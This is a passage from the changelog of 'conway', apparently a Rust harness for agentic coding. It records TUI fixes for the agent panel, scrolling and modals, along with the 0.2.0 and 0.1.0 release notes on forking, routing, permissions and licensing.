  reports, one root cause each:

  The panel's visibility filter defaulted to active-only, so a finished
  agent's row vanished the instant it finished — with `v` (the filter
  cycle key) undiscovered, that reads as agents disappearing at random. The
  default is now **all**: the list's *shape* stays stable regardless of
  status, and the existing per-row marker (`v`/`x`/`-` vs `*`/`o`/`?`)
  already conveys "still running" at a glance. `v` still cycles
  all → finished-only → active-only → all; only the starting point moved.

  Focusing a subagent used to clear the transcript down to that agent's own
  log with no indication of how it got there. The sticky context header
  (T6) now grows a lineage breadcrumb off-root — `agent <id> via root →
  fork @seq 3 → @reviewer` — built from the same per-node provenance text
  the panel row already shows (`fork @seq N`, `@agent_def`, `(inherit)`),
  so it can never disagree with the panel. It is metadata only, never the
  ancestor's actual transcript content: a fork child truly inherited its
  parent's log up to a fixed point and showing that would be accurate, but
  a spawn child inherited nothing, and showing parent content next to it
  would display information the agent never saw. A deep chain degrades to
  a shorter complete form (`…(N)` collapsing the middle) rather than
  clipping mid-word, the same shape the T6 floating footer already uses.

- **Two-finger scroll works again.** In v0.3.0 the mouse wheel recalled
  input history instead of scrolling the transcript. Bare `Up`/`Down` now
  scroll one line; history recall moved to `Ctrl-P`/`Ctrl-N`.

  The cause is worth stating, because the earlier documentation had it
  wrong. Conway does not capture the mouse — doing so would disable the
  terminal's click-drag text selection, which the transcript's clean-copy
  guarantee protects. The previous notes concluded from this that the wheel
  never reached Conway at all. It does: terminals implement *alternate
  scroll* (DECSET 1007), translating wheel events into `Up`/`Down` cursor
  keys while the alternate screen is active. So when v0.3.0 bound those
  arrows to history, it silently took the wheel with them.

  Conway cannot distinguish a wheel-driven arrow from a typed one — that
  distinction is precisely what mouse capture would provide — so the arrows
  go to the more frequent interaction, and history takes the readline
  chord. `PageUp`/`PageDown` and `Home`/`End` are unchanged.

- **TUI: modals no longer eat the whole screen (V1).** The permission
  prompt's own comment used to read *"claim nearly the whole transcript
  area"* — which was the bug: a modal that always filled the screen
  regardless of how little it had to say. The permission prompt, the
  `/ask` modal, the NL intent-confirm card, and `/help` now share one
  primitive (`tui/view/modal.rs`): bottom-anchored, sized to their own
  content, capped at a maximum, with the transcript still visible above
  them. A long command/answer/prompt that exceeds the cap now **scrolls**
  (`PageUp`/`PageDown`, a single shared `AppState::modal_scroll` field —
  the old permission-only `permission_scroll`, generalized) instead of
  either truncating silently or filling the screen. `/agents` stays a
  panel rather than becoming a fifth modal on this primitive — it's meant
  to be browsed while still composing, sharing the screen with a live
  input line, which a modal (drawn *over* the transcript) cannot do.

  A new tree/menu navigation primitive (`tui/view/menu.rs`) is layered on
  the modal for a later settings surface (V4) to fill in — nested,
  collapsible groups with keyboard navigation, not wired to anything yet
  but fully exercised by its own tests, so that surface can build on a
  finished primitive rather than a half one. See `docs/crates/conway-cli.md`
  for the cap-fraction measurement and the full reasoning.

## [0.2.0] — 2026-07-23

### Changed

- **License: relicensed from Apache-2.0 to AGPL-3.0-only.** conway is now
  covered by the GNU Affero General Public License v3.0 — running a modified
  conway as a network service requires making the modified source available to
  its users. This is a deliberate choice for an agent harness and means conway
  is not intended for use as a permissively-licensed library dependency inside
  closed-source software. See [LICENSE](LICENSE).
- **Unified the two model-capability systems** into a single source of truth:
  the router's context-fit gate and `Backend::capabilities()` now resolve
  through the same path, so a `models.json` value has one predictable routing
  effect instead of silently diverging.
- **Redesigned the TUI** to a single-column, copy-paste-friendly layout
  (conversation stream, input box, status line) with a live `/`-command
  palette and an on-demand agent-tree panel, replacing the always-on paned
  layout that dragged UI chrome into the clipboard.

### Added

- **`ContextHook`** — a pluggable per-call context/tool-curation port: mask
  records, edit the system prompt, filter the announced tool set, or react to
  context overflow. No built-in curation policy and no automatic compaction;
  with no hook registered, behavior is unchanged.
- **Out-of-context record mask** — mark log records to exclude from LLM calls
  while keeping them in the append-only log (reversible).
- **Reasoning support at the wire layer** — extended-thinking budget /
  reasoning-effort request params per dialect, Anthropic thinking-block
  signature round-trip across tool loops, and `redacted_thinking` handling.
- **TUI keyboard navigation** — arrow-select + autofill in the `/`-command
  palette, and arrow-scroll + Esc-to-close in the agent panel.
- **`/ask`** — an ephemeral forked question rendered as a dimmed aside; it
  inherits the session's context but never pollutes the transcript.
- **Failure observability** — backend and routing errors are surfaced to
  stderr (including the reasons a candidate was rejected).
- **OSS front door** — a README and a runnable offline example
  (`cargo run -p conway --example minimal_session`).

### Fixed

- **Multi-turn tool use no longer loops.** Assistant records now persist the
  tool calls they made, so a follow-up turn sees the tool result instead of
  re-calling the tool indefinitely; tool-call-only assistant turns serialize an
  empty string rather than `null` (which some OpenAI-compatible servers, e.g.
  Ollama Cloud, reject).
- **Dialect-aware health probe** — the probe now uses a liveness endpoint the
  target dialect actually serves, and an unsupported liveness path is no longer
  counted as a health failure that opens the circuit breaker.
- **`--model`** is now wired to a facade pin (previously accepted by the CLI
  parser but inert — a 0.1.0 known limitation).

## [0.1.0] — 2026-07-22

First release. conway is a Rust agent harness for agentic coding, built around
one library that serves three consumption modes equally, first-class
hierarchical forking, and a strict ports-and-adapters architecture where every
capability is a plugin.

### Architecture

- **8-crate Cargo workspace** with strictly downward dependencies
  (ports-and-adapters):
  - `conway-core` — domain types and port traits only; no I/O.
  - `conway-backends` — provider adapters (Anthropic native, OpenAI-compatible).
  - `conway-routing` — declarative role→model routing, health, and failover.
  - `conway-session` — append-only session persistence and transcript resolution.
  - `conway-tools` — the built-in tool/plugin implementations.
  - `conway-runtime` — the agent loop, supervision, and orchestration.
  - `conway` — the public facade (the single supported embedding surface).
  - `conway-cli` — the `conway` binary; depends only on the `conway` facade.
- The `SubagentHost` port breaks the tools↔runtime cycle so tools can spawn
  sub-agents without an upward dependency.

### Three consumption modes (one library)

- **Embeddable Rust library** — the primary surface. A `Conway` builder plus
  `SessionHandle` API: fully async, event-streamed, designed to be driven from a
  host application (e.g. a Tauri IDE).
- **Interactive TUI** — a terminal shell with live token streaming, an agent-tree
  pane, in-UI permission prompts, an editable input line, and slash commands
  (`/steer`, `/tree`, `/context`, `/why`, `/fork`, `/spawn`, `/resume`, `/help`,
  `/quit`).
- **`-p` / `--print` one-shot** — a clean, scriptable non-interactive mode:
  prompt from argv or stdin, streamed output, `--output-format text|json|jsonl`,
  strict stdout purity (only model output on stdout; all diagnostics on stderr),
  stable exit codes, and SIGINT handling.

### Hierarchical forking and spawning (distinct primitives)

- **Fork** — a child inherits the forker's *entire* effective context at the fork
  point as a literal, immutable, cache-friendly prefix, plus an added directive.
  Storage is O(1): one header line, zero records copied. Siblings forked at the
  same point share a single memoized prefix allocation.
- **Spawn** — a clean-slate child that requires an agent definition; it inherits
  no parent context. Fork and spawn are genuinely separate primitives — there is
  no partial-inheritance knob.
- **Copy-on-fork snapshot semantics** — after a fork the two sessions are
  independent append-only logs. Prompting the parent never reaches the child, and
  prompting the child never reaches the parent; the inherited prefix is bounded
  at the fork sequence and is byte-identical to a snapshot.
- **Bidirectional messaging** — parents steer children (applied at turn
  boundaries) and can soft- or hard-cancel them; children report progress and
  terminal results back. This is explicit, addressed messaging — separate from
  context inheritance.
- **Aggregate** — a parent can fork, spawn N differently-prompted children, and
  collect their results. A parent's `await` on a child can never hang: the
  supervisor synthesizes a terminal result on panic, budget exhaustion, or
  cancellation.

### Session persistence and continuity

- Append-only JSONL session store, one file per session, with crash-tolerant
  reads.
- **Resume** a persisted session and continue it — from both the library and the
  CLI (`--resume <id>`).
- **Fork-from** a persisted session at any sequence — from both the library and
  the CLI (`--fork-from <id>[@<seq>]`); the child genuinely inherits the parent's
  context, transitively across multi-level fork chains.
- Caller-chosen session ids (`--session <id>`), with honest usage errors on
  collision (directs the user to `--resume`).
- `Runtime::resume_root` re-registers a persisted agent as live, gated so it idles
  until its first prompt rather than racing a spurious turn against the old
  transcript.
- Full session inspection surface: `conway sessions list | show | tree | export`.

### Provider routing and backends

- **Backends**:
  - Anthropic native (Messages API), with cache-breakpoint mapping.
    API-key authentication only.
  - OpenAI-compatible, with per-dialect adapters for **Ollama**, **vLLM / Hermes**,
    **LM Studio**, and **llama.cpp server**.
- **Declarative routing** — per-role model aliases with explicit fallback chains;
  every response can be traced to which model served it and why
  (`conway routes explain`). No content inspection, no learned classifiers.
- **Health and failover** — dual circuit breakers per endpoint (transport and
  probe), a background prober, and an attempt/fallback loop that records health
  observations and fails over on transport, server, and rate-limit errors.
- **Capability-aware** — per-model tool-calling reliability, streaming behavior,
  and prompt-caching support are first-class. Prompt caching is used
  opportunistically but is never correctness-bearing (verified by byte-identity
  tests).

### Tools and extensibility

- Built-in plugins, all implemented on the *same* public Plugin/Tool API that
  third parties use (no privileged core tools):
  - Filesystem: read, write, edit, glob, grep.
  - Shell: bash execution with process-group termination on cancel.
  - Fork/subagent tools.
  - Explicit report/finalization tools.
- **Permission gate model** — allow-list, deny-all, and interactive-prompt gates,
  with a callback surface for the embedder. One-shot mode defaults fail-closed
  (an empty allow-list denies every tool) because it cannot prompt an operator.
- Sandboxing and worktree isolation are left to an agent's own tools rather than
  imposed by the harness.

### Reliability (multi-agent failure-mode mitigations)

- Full context provenance: every context segment records where it came from
  (a 9-variant provenance model).
- Literal prefix inheritance — no lossy summarization of inherited context.
- Repeated-step detection.
- Mandatory budgets (token and deadline), enforced as hard ceilings.
- Result-contract schema validation with a single retry, then an explicit
  refusal rather than a silent bad result.

### Security

- Anthropic OAuth subscription tokens (`sk-ant-oat…`) are rejected at three
  layers — conway is metered-API-key only, by design.
- Cross-session agent access is rejected (`AgentNotInSession`); an agent handle
  cannot drive a session it does not belong to.

### Known limitations (deliberate for 0.1.0)

- No Claude Pro/Max subscription authentication — metered API keys only.
- `--model` is accepted by the CLI parser but not yet wired to a facade pin field.
- Cross-*backend-kind* failover has unit coverage but no end-to-end integration
  test yet.
- No bundled example third-party plugin, and OSS-release docs (README,
  plugin-author guide) are not yet written.

<!-- Only versions that carry a git tag are linked. Tagging began at v0.4.0
    ; 0.3.0 and earlier were released
     untagged and have no target to point at. -->

[Unreleased]: https://github.com/devnill/conway/compare/v0.9.0...HEAD
[0.9.0]: https://github.com/devnill/conway/releases/tag/v0.9.0
[0.8.0]: https://github.com/devnill/conway/releases/tag/v0.8.0
[0.7.0]: https://github.com/devnill/conway/releases/tag/v0.7.0
[0.6.0]: https://github.com/devnill/conway/releases/tag/v0.6.0
[0.5.0]: https://github.com/devnill/conway/releases/tag/v0.5.0
[0.4.0]: https://github.com/devnill/conway/releases/tag/v0.4.0

